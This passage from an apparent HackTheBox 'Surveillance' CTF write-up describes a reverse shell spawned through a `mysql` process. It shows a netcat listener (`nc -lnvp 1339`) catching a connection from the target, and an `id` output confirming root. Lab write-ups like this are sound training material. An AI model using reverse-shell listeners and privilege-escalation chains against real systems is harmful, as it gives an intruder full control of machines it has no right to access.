Meaning that during the execution of the `mysql` process, the sub-shell will spawn a child process. This process is the reverse shell process and will initiate a connection back to my listener. We can see below that we indeed get a call back with root privileges. 

<pre class="grey-code">
	<code>
┌──(kali㉿kali)-[~/CTF/SurveillanceHTB]
└─$ <span class="highlight-command">nc -lnvp 1339</span>
listening on [any] 1339 ...
connect to [10.10.15.14] from (UNKNOWN) [10.10.11.245] 39796
bash: cannot set terminal process group (1112): Inappropriate ioctl for device
bash: no job control in this shell
root@surveillance:/home/zoneminder# <span class="highlight-command">id</span>
id
<span class="highlight-output">uid=0(root) gid=0(root) groups=0(root)</span>
	</code>
</pre>
<figure>
  <figcaption class="figcaption-style">Receiving the connection on my listener and confirming root privileges.</figcaption>
</figure>
